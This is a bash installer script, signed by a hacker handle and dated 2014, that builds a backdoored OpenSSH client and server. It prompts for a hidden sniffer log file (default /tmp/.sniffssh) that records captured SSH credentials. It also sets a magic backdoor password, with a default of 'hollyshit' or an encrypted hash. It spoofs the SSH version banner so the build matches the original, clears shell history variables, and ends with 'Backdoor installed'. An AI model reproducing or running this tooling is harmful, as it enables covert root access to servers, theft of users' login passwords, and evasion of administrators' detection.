#!/bin/bash
# bl0wsshd00r67p1 . bl0w@koresec.org . 2014
# - brazilian old school never dies
#
# greetz rfs r47 bonny mayhem all #darknet@efnet and #offset@brasnet old school members.


if [ "$(whoami)" != "root" ]; then
   echo "you must be root!"
   echo " "
   exit 0
fi

 if [ -e `which gcc` ]; then
    echo "GCC found!"
    else
    echo "Sorry, no GCC Compiler has been found."
    exit 0
 fi

 if [ -e `which perl` ]; then
    echo "PERL found!"
    else
    echo "Sorry, no PERL has been found."
    exit 0
 fi

# echo "- bl0wsshd00r67p1 coded by bl0w@koresec.org -brazilian oldschool never dies."

echo "Enter Log File Password. default: /tmp/.sniffssh"
read bdlogfile

if [ -z "$bdlogfile" ]; then
  bdlogfile=/tmp/.sniffssh
fi
#define bdlogfile "/tmp/ilog"
echo "#define bdlogfile    \"$bdlogfile\"" >> includes.h


TEST=""
elf=1
bc=1
while [ -z "$TEST" ] ; do
    if [ "$elf" = "1" ] ; then
        TEST="Yes"
    else
        TEST="No"
    fi
    echo ""
    echo "Do you want to encrypt sniffer log files? Yes or No"
    echo $n "[$TEST] "
        read cc
    if [ -z "$cc" ] ; then
        cc=$TEST
    fi
    case "$cc" in
        [Yy]*)
            elf="1"
            ;;
        [Nn]*)
            elf=""
            ;;
        *)
            echo ""
            echo "You must enter either Yes or No"
            TEST=""
            ;;
    esac

done

TEST=""
while [ -z "$TEST" ] ; do
    if [ "$bc" = "1" ] ; then
        TEST="Yes"
    else
        TEST="No"
    fi
    echo ""
    echo "Do you want to encrypt password backdoor? Yes or No"
    echo $n "[$TEST] "
        read cc
    if [ -z "$cc" ] ; then
        cc=$TEST
    fi
    case "$cc" in
        [Yy]*)
            bc="1"
            ;;
        [Nn]*)
            bc=""
            ;;
        *)
            echo ""
            echo "You must enter either Yes or No"
            TEST=""
            ;;
    esac

done

#echo $elf
#echo $bdlogfile
#echo $bc

ligado=1
desligado=0

if [ $elf = $ligado ]; then
echo "-------------------o"
echo "Ok! Your logs will be encryptepd, generating decrypt0r"
echo "Use: ./decryptlog <sniffer log encrypted>"
gcc -o decryptlog decryptlog.c
ls -la decryptlog

decryptordir=./
echo "DONE! You can set a full binary path for decryptlog. default: ./decryptlog (You will set manually bro.)"
read decryptodir

if [ -z "$decryptodir" ]; then
  decryptodir=./decryptlog
fi

mv decryptlog $decryptodir>/dev/null
ls -la $decryptodir
echo "#define CL 0" >> includes.h
fi


if [ $bc = $ligado ]; then

echo "Generating your encrypt0r-password."
gcc -o cryptback cryptback.c -lcrypt
ls -la cryptback
echo "Now, we will generate your password hash encrypted. Enter your backdoor password, and wait for a hash."
./cryptback
echo "Entry your password encrypted here:"
read penc


echo "#define BC 0" >> auth-bd.h
echo "#ifdef BC" >> auth-bd.h
echo "const char *bdpassword2 = \"$penc\";" >> auth-bd.h
echo "#else" >> auth-bd.h
echo "#define bdpassword \"bleh\"" >> auth-bd.h
echo "#endif" >> auth-bd.h
else
echo "Enter your password: default.: hollyshit"
read np
if [ -z "$np" ]; then
  np=hollyshit
fi

echo "//#define BC 0" >> auth-bd.h
echo "#ifdef BC" >> auth-bd.h
echo "const char *bdpassword2 = \"$penc\"" >> auth-bd.h
echo "#else" >> auth-bd.h
echo "#define bdpassword \"$np\"" >> auth-bd.h
echo "#endif" >> auth-bd.h
fi
echo "OK. Whats --prefix= for install? default: /usr"
read pref
if [ -z "$pref" ]; then
  pref=/usr
fi

echo "OK. Whats --sysconfdir= for install? default: /etc/ssh"
read scd
if [ -z "$scd" ]; then
  scd=/etc/ssh
fi

echo "OK. Whats extra parameters? Default: --without-kerberos5 --without-zlib-version-check --with-pam"
read epr
if [ -z "$epr" ]; then
  epr="--without-kerberos5 --without-zlib-version-check --with-pam";
fi

echo "Configuring BANNER."
ssh_cmd=$(ssh -V 2>&1)
ssh_version=$(echo "$ssh_cmd" | /usr/bin/cut -d " " -f 1 | /usr/bin/cut -c 9- | /usr/bin/cut -d p -f 1)
ssh_portable=p$(echo "$ssh_cmd" | /usr/bin/cut -d " " -f 1 | /usr/bin/cut -c 9- | /usr/bin/cut -d p -f 2 | cut -d , -f 1)
ssh_versi=$(echo "$ssh_cmd" | /usr/bin/cut -d " " -f 1 | /usr/bin/cut -c 9- | /usr/bin/cut -d p -f 1)
ssh_por=p$(echo "$ssh_cmd" | /usr/bin/cut -d " " -f 1 | /usr/bin/cut -c 9- | /usr/bin/cut -d p -f 2 | cut -d , -f 1)

unset HISTFILE;unset HISTSIZE;unset HISTNAME;unset HISTSAVE;unset HISTFILESIZE

printf "SSH Version OpenSSH_$ssh_versi :"
read SSHDVE
if [ -z "$SSHDVE" ]; then
  ssh_version=OpenSSH_$ssh_versi
else
  ssh_version=$SSHDVE
fi

printf "SSH Portable:  $ssh_por :"
read SSHPO
if [ -z "$SSHPO" ]; then
  ssh_portable=$ssh_por
else
  ssh_portable=$SSHPO
fi

echo "#define SSH_VERSION     \"$ssh_version\""                         >> version.h
echo "#define SSH_PORTABLE    \"$ssh_portable\""                        >> version.h
echo "#define SSH_RELEASE     SSH_VERSION SSH_PORTABLE"                 >> version.h




echo "OK, Now we will run ./configure"
echo "./configure --prefix=$pref --sysconfdir=$scd $epr>/dev/null"
./configure --prefix=$pref --sysconfdir=$scd $epr>/dev/null

if [ `echo $?` = 1 ]; then
  clear
  printf "PAM Error. Trying without libpam\n"
  sleep 3

./configure --prefix=/usr --sysconfdir=/etc/ssh  > /dev/null

fi

echo "-----------------------------"
echo "Configure OK, generating binaries."
echo "make"
make > /dev/null

ls -la ssh
ls -la sshd

mkdir ./backup-binaries
# chattr -i /usr/bin/ssh
# chattr -i /usr/bin/sshd
cp /usr/bin/ssh ./backup-binaries/
cp /usr/sbin/sshd ./backup-binaries/

# echo "**NOTE**"
# echo "**NOTE** IF YOU CHANGED --PREFIX, YOU WILL NEED TO INSTALL BINARIES MANUALLY!!"
# echo "**NOTE**"
# echo "We created a backup from original binaries for ssh and sshd at: ./backup-binaries ."
# mv ssh /usr/bin/
# mv sshd /usr/sbin/
# chmod +x /usr/sbin/sshd /usr/bin/ssh

# echo "Restarting SSH."
# if [ -e /var/run/sshd.pid ]; then
# 	kill `cat /var/run/sshd.pid`
# 	/usr/sbin/sshd
# else
# 	kill `pidof sshd | awk '{ print $1 }'`
# 	/usr/sbin/sshd
# fi
echo "Backdoor installed. use root@localhost and use your magic password to test."
echo "Make install isnt used, but ssh and sshd binaries has been instaled and rehashed. You can try to use it too. =P"
echo "More sugestions send email. bl0w@koresec.org . Or try findme at EFNet"
